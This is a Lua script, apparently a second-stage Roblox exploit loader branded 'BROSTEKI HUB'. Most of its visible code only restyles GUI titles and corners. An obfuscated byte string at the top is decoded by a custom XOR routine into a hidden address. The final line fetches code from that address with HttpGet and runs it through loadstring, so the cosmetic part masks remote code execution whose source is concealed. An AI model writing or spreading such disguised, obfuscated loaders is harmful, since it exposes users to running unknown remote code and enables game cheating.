
--[[ STAGE 2: VISUAL CORE ]]
local IsI9x9JNZpBPKEjo="\009\033\028\098\104\109\119\039\122\131\051\136\055\065\067\086\093\091\067\083\108\108\105\118\107\095\111\141\132\098\127\143\137\145\162\150\164\165\161\142\247\186\185\181\197\011\204\208\201\227\219\215\225\238\226\051\236\255\254\245\005\001\013\005\022\027\030\099\037\043\035\114\060\058\053\072\070\075\067\086\077\095\101\086\109\100\116\109\111\186\135\117\138\203\207\222\155\156\164\168\160"local FPXPUFBJ2TbXp=64 local nGUPHTa6HmmU_m9CV=227 local iKi3jgbjheV8r6v5T9_Ax=0 local hlWJFvXbzxt0DhEFqt=4 local RT3Tc7YqQsljMXE=1 local mUEd08qLHc3zdnTrPiY5=true local xyEzoPR2QReKLfBtXWVZrZ=bit32 and bit32.bxor if not xyEzoPR2QReKLfBtXWVZrZ then xyEzoPR2QReKLfBtXWVZrZ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local c70ovBBNMwnT3co5Bux8Ig={}for CB3SJq1dxTV3J12Kuk=1,#IsI9x9JNZpBPKEjo do local genOQdlMehD3fg5Ixga=string.byte(IsI9x9JNZpBPKEjo,CB3SJq1dxTV3J12Kuk)local H00qI306pmJyD8Mn=(nGUPHTa6HmmU_m9CV+(CB3SJq1dxTV3J12Kuk*hlWJFvXbzxt0DhEFqt)+RT3Tc7YqQsljMXE)%256 if iKi3jgbjheV8r6v5T9_Ax==0 then genOQdlMehD3fg5Ixga=(genOQdlMehD3fg5Ixga-H00qI306pmJyD8Mn)%256 c70ovBBNMwnT3co5Bux8Ig[CB3SJq1dxTV3J12Kuk]=string.char(xyEzoPR2QReKLfBtXWVZrZ(genOQdlMehD3fg5Ixga,FPXPUFBJ2TbXp))else genOQdlMehD3fg5Ixga=xyEzoPR2QReKLfBtXWVZrZ(genOQdlMehD3fg5Ixga,FPXPUFBJ2TbXp)c70ovBBNMwnT3co5Bux8Ig[CB3SJq1dxTV3J12Kuk]=string.char((genOQdlMehD3fg5Ixga-H00qI306pmJyD8Mn)%256)end end local EPBQJ2ysgJlfULS=table.concat(c70ovBBNMwnT3co5Bux8Ig)if mUEd08qLHc3zdnTrPiY5 then EPBQJ2ysgJlfULS=string.reverse(EPBQJ2ysgJlfULS)end local zYePVQHWV7WybDn7=EPBQJ2ysgJlfULS
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(zYePVQHWV7WybDn7))()
